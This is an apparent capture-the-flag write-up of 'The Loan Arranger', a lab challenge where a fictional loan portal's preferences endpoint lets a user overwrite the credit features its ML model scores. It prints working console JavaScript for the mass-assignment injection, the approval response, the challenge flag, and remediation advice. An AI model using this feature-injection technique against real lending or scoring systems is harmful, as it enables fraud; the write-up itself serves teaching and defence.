---
layout: post
title: "The Loan Arranger"
category: "ML Security"
difficulty: Medium
points: 60
event: "2026: An AI Odyssey"
date: 2026-05-28
---
## Overview

The Loan Arranger is a medium-difficulty ML Security challenge set in the fictional CortexLend platform — an AI-powered loan approval portal backed by a GradientBoosting machine learning model. The objective was to obtain a fraudulent loan approval by exploiting a vulnerability in the ML pipeline.

The core vulnerability was a **mass assignment / feature store namespace collision**: a preferences API endpoint accepted arbitrary JSON fields and inadvertently overwrote the credit features used by the ML model, allowing an attacker to manipulate the model's inputs and obtain an approval.

---

## Reconnaissance

### Target Enumeration

The challenge provided a target IP. Initial browser access to `http://<TARGET_IP>` revealed the CortexLend web application — a single-page app with a login/register interface.

### Application Analysis

After creating an account and logging in, the dashboard exposed:

- **Credit Profile** — the feature set fed into the ML scoring model:
  - Credit Score: `612` (Poor)
  - Employment: `18 months`
  - Previous Defaults: `None`
  - Late Payments: `1`
  - Debt-to-Income: `35%`
  - Risk Assessment: `High Risk`

- **Loan Request form** — submits to `/api/loan/apply` via POST with no request body (profile pulled server-side)

- **Account Settings panel** — sends preferences (theme, timezone, email frequency) to `/api/profile/preferences` via PATCH

The page source revealed three key API endpoints:

| Endpoint | Method | Purpose |
|---|---|---|
| `/auth/login` | POST | User authentication |
| `/auth/register` | POST | Account creation |
| `/api/loan/apply` | POST | Submit loan application |
| `/api/profile/preferences` | PATCH | Update account preferences |
| `/api/loan/explain` | GET | SHAP-based model explanation |

---

## Vulnerability Analysis

### Mass Assignment / Feature Store Namespace Collision

The `/api/profile/preferences` endpoint was designed to accept only three fields:

```json
{
  "notification_freq": "weekly",
  "theme": "dark",
  "timezone": "UTC"
}
```

However, the server performed **no input validation or field allowlisting**. It accepted any JSON fields and stored them — including fields that shared the same namespace as the ML model's credit features.

This is a **feature store namespace collision**: the preferences store and the credit feature store shared the same underlying data structure. By injecting credit-related fields into the preferences PATCH request, an attacker could overwrite the ML model's input features with arbitrary values.

### Why This Works

The GradientBoosting model reads credit features from the user's profile at inference time. When the preferences endpoint writes attacker-controlled values under keys like `credit_score` or `debt_to_income`, those values are later read by the model as legitimate credit data — resulting in a manipulated decision.

This is analogous to a **SQL injection for ML pipelines**: instead of injecting SQL syntax, the attacker injects fraudulent feature values directly into the feature store.

---

## Exploitation

### Step 1 — Create an Account

Navigate to `http://<TARGET_IP>` and register a new account.

### Step 2 — Confirm Denial

Submit the loan application to confirm the baseline behaviour — the ML model denies the application based on the poor credit profile (score 612, high risk).

### Step 3 — Inject Malicious Features

Open the browser developer console and run the following:

```javascript
const p = await fetch('/api/profile/preferences', {
  method: 'PATCH',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    notification_freq: 'weekly',
    theme: 'dark',
    timezone: 'UTC',
    credit_score: 950,
    employment_months: 120,
    late_payments: 0,
    debt_to_income: 0.05,
    previous_defaults: 0
  })
});
console.log(await p.json());
```

**Response:**
```json
{ "fields": 8, "status": "updated" }
```

The server accepted all 8 fields — including the injected credit features.

### Step 4 — Submit the Loan Application

```javascript
const r = await fetch('/api/loan/apply', { method: 'POST' });
console.log(await r.json());
```

**Response:**
```json
{
  "message": "Congratulations! Your application has been approved. THM{f34tur3_st0r3_n4m3sp4c3_c0ll1s10n}",
  "score": 0.7479,
  "status": "approved"
}
```

The ML model evaluated the injected features instead of the legitimate credit profile and approved the application, returning the flag embedded in the approval message.

---

## Flag

```
THM{f34tur3_st0r3_n4m3sp4c3_c0ll1s10n}
```

---

## Root Cause

The vulnerability stems from two compounding weaknesses:

1. **Missing input validation** — The `/api/profile/preferences` PATCH endpoint performed no allowlisting of accepted fields, enabling mass assignment of arbitrary data.

2. **Shared feature namespace** — Preference data and ML credit features were stored in the same user profile object. There was no separation between user-controlled preference fields and trusted ML feature fields.

---

## Remediation

| Issue | Fix |
|---|---|
| Mass assignment | Explicitly allowlist accepted fields on the preferences endpoint. Reject any fields not in `{notification_freq, theme, timezone}`. |
| Feature namespace collision | Separate user preferences from ML features at the data model level. ML features should be stored in a separate, write-protected structure not accessible via user-facing APIs. |
| Untrusted feature ingestion | Treat all user-supplied data as untrusted. ML features used for high-stakes decisions should be sourced from verified, tamper-evident data pipelines. |
| Lack of anomaly detection | Implement feature drift detection — a credit score jumping from 612 to 950 between requests should trigger a review. |

---

## Lessons Learned

- **ML systems are only as trustworthy as their feature pipelines.** Even a well-trained model is trivially defeated if an attacker can control its inputs.
- **Mass assignment vulnerabilities extend beyond traditional web apps** — they are especially dangerous in AI/ML systems where arbitrary field injection can directly manipulate model behaviour.
- **SHAP explanations** (exposed via `/api/loan/explain`) can also be used by attackers to understand which features have the most influence, guiding targeted feature manipulation.
- Always apply **defence in depth** to ML pipelines: validate inputs, enforce feature provenance, and monitor for anomalous feature values at inference time.

---

## Tools Used

- Firefox DevTools (Network & Console)
- Browser console (JavaScript fetch API)
- Nmap (initial port scan)

---

*Writeup by: ByteChef | TryHackMe: ByteChef*  
*Challenge: TryHackMe Token City — The Loan Arranger (2026: An AI Odyssey CTF)*
